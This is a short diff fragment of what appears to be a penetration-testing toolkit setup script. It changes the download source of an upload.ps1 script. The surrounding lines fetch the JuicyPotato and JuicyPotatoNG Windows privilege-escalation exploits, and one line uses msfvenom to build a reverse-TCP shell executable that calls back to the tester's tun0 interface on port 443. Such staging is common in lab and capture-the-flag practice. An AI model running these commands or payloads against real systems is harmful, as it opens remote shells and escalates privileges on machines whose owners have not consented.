@@ -69,7 +69,7 @@ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
 unzip JuicyPotatoNG.zip
 
-wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1
+wget https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1
 
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
 
